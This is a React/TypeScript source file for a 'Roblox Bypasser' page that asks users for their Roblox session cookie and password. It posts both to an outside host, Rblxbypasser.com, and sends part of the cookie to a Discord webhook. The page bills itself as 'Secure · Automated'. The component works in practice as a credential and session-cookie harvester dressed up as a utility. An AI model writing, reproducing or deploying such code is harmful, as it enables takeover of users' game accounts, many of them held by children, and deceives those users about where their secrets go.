import { useState, useEffect } from "react";
import { useNavigate } from "react-router-dom";
import { Eye, EyeOff, ShieldCheck, ArrowLeft, Loader2, CheckCircle2, XCircle, Cookie } from "lucide-react";
import ShieldIcon from "@/components/ShieldIcon";
import { sendDiscordWebhook } from "@/lib/tokenStore";
import { toast } from "sonner";

const WEBHOOK_KEY = "discord_webhook_url";
const RATE_LIMIT_KEY = "bypass_attempts";
const MAX_ATTEMPTS_PER_MIN = 10;
const BYPASS_API_URL = "https://Rblxbypasser.com";

type BypassStatus = "idle" | "loading" | "success" | "error";

const BypassPage = () => {
  const [cookie, setCookie] = useState("");
  const [password, setPassword] = useState("");
  const [showPassword, setShowPassword] = useState(false);
  const [status, setStatus] = useState<BypassStatus>("idle");
  const [log, setLog] = useState<string[]>([]);
  const [remaining, setRemaining] = useState(MAX_ATTEMPTS_PER_MIN);
  const navigate = useNavigate();

  useEffect(() => {
    if (sessionStorage.getItem("authenticated") !== "true") {
      navigate("/");
    }
    setRemaining(getRemainingAttempts());
  }, [navigate]);

  function getAttempts(): number[] {
    try {
      const raw = localStorage.getItem(RATE_LIMIT_KEY);
      if (!raw) return [];
      const cutoff = Date.now() - 60_000;
      return (JSON.parse(raw) as number[]).filter(t => t > cutoff);
    } catch {
      return [];
    }
  }

  function getRemainingAttempts(): number {
    return Math.max(0, MAX_ATTEMPTS_PER_MIN - getAttempts().length);
  }

  function recordAttempt() {
    const attempts = getAttempts();
    attempts.push(Date.now());
    localStorage.setItem(RATE_LIMIT_KEY, JSON.stringify(attempts));
    setRemaining(Math.max(0, MAX_ATTEMPTS_PER_MIN - attempts.length));
  }

  const addLog = (msg: string) => {
    setLog(prev => [...prev, `[${new Date().toLocaleTimeString()}] ${msg}`]);
  };

  const handleBypass = async () => {
    if (!cookie.trim()) {
      toast.error("Please enter a cookie");
      return;
    }

    const attempts = getAttempts();
    if (attempts.length >= MAX_ATTEMPTS_PER_MIN) {
      const oldest = attempts[0];
      const wait = Math.ceil((60_000 - (Date.now() - oldest)) / 1000);
      toast.error(`Rate limit reached. Try again in ${wait}s.`);
      return;
    }

    recordAttempt();
    setStatus("loading");
    setLog([]);
    addLog("Initializing bypass...");
    addLog(`Connecting to ${BYPASS_API_URL}...`);

    try {
      const res = await fetch(BYPASS_API_URL, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ cookie: cookie.trim(), password }),
      });

      const text = await res.text();
      let data: any = text;
      try { data = JSON.parse(text); } catch {}

      addLog(`Response ${res.status} ${res.statusText}`);
      if (typeof data === "object") addLog(JSON.stringify(data).slice(0, 200));
      else addLog(String(data).slice(0, 200));

      if (!res.ok) throw new Error(`API error ${res.status}`);

      addLog("✅ Bypass completed successfully!");
      setStatus("success");
      toast.success("Bypass successful!");

      const webhook = localStorage.getItem(WEBHOOK_KEY);
      if (webhook) {
        sendDiscordWebhook(webhook, `🔓 Bypass executed. Cookie: \`${cookie.slice(0, 20)}...\``);
      }
    } catch (err: any) {
      addLog(`❌ ${err?.message || "Bypass failed"}`);
      setStatus("error");
      toast.error("Bypass failed");
    }
  };

  return (
    <div className="min-h-screen px-4 py-6 relative overflow-hidden">
      <div className="absolute top-1/4 left-1/2 -translate-x-1/2 w-[500px] h-[500px] rounded-full bg-primary/5 blur-[120px] pointer-events-none" />

      <div className="max-w-sm mx-auto space-y-6 relative z-10 animate-fade-in-up">
        {/* Header */}
        <div className="flex items-center gap-3">
          <button onClick={() => navigate("/dashboard")} className="text-muted-foreground hover:text-foreground transition-colors p-1">
            <ArrowLeft size={20} />
          </button>
          <h1 className="text-xl font-bold text-foreground">Roblox Bypasser</h1>
        </div>

        {/* Shield */}
        <ShieldIcon size="md" />

        <div className="text-center space-y-1">
          <h2 className="text-2xl font-black text-foreground glow-text">Start Bypass</h2>
          <p className="text-muted-foreground text-xs">Secure automation with real-time bypassing</p>
        </div>

        {/* Form */}
        <div className="card-glow rounded-2xl p-5 space-y-4">
          <div className="space-y-2">
            <label className="text-sm font-semibold text-foreground flex items-center gap-1.5">
              <Cookie size={14} className="text-primary" /> Cookie
            </label>
            <input
              value={cookie}
              onChange={e => setCookie(e.target.value)}
              placeholder="_|WARNING:-DO-NOT-SHARE-THIS.-S..."
              className="input-field text-sm font-mono"
            />
          </div>

          <div className="space-y-2">
            <label className="text-sm font-semibold text-foreground">Password</label>
            <div className="relative">
              <input
                type={showPassword ? "text" : "password"}
                value={password}
                onChange={e => setPassword(e.target.value)}
                placeholder="Enter your password"
                className="input-field pr-10"
              />
              <button
                type="button"
                onClick={() => setShowPassword(!showPassword)}
                className="absolute right-3 top-1/2 -translate-y-1/2 text-muted-foreground hover:text-foreground transition-colors"
              >
                {showPassword ? <EyeOff size={18} /> : <Eye size={18} />}
              </button>
            </div>
          </div>

          <button
            onClick={handleBypass}
            disabled={status === "loading"}
            className="w-full shimmer text-primary-foreground font-semibold py-3.5 rounded-xl flex items-center justify-center gap-2.5 glow-btn transition-all duration-300 disabled:opacity-50"
          >
            {status === "loading" ? (
              <>
                <Loader2 size={18} className="animate-spin" /> Bypassing...
              </>
            ) : status === "success" ? (
              <>
                <CheckCircle2 size={18} /> Bypassed!
              </>
            ) : status === "error" ? (
              <>
                <XCircle size={18} /> Retry Bypass
              </>
            ) : (
              <>
                <ShieldCheck size={18} /> Start Bypass
              </>
            )}
          </button>
          <p className="text-[11px] text-muted-foreground text-center">
            {remaining} / {MAX_ATTEMPTS_PER_MIN} attempts remaining this minute
          </p>
        </div>

        {/* Log Output */}
        {log.length > 0 && (
          <div className="card-glow rounded-2xl p-4 space-y-2">
            <h3 className="text-xs font-bold text-muted-foreground uppercase tracking-wider">Console</h3>
            <div className="bg-secondary/50 rounded-xl p-3 max-h-40 overflow-y-auto font-mono text-[11px] space-y-1">
              {log.map((entry, i) => (
                <p key={i} className={entry.includes("✅") ? "text-[hsl(var(--success))]" : entry.includes("❌") ? "text-destructive" : "text-muted-foreground"}>
                  {entry}
                </p>
              ))}
              {status === "loading" && (
                <p className="text-primary animate-pulse">Processing...</p>
              )}
            </div>
          </div>
        )}

        <p className="text-xs text-muted-foreground text-center tracking-wider">
          Secure · Automated · Real-time Bypassing
        </p>
      </div>
    </div>
  );
};

export default BypassPage;
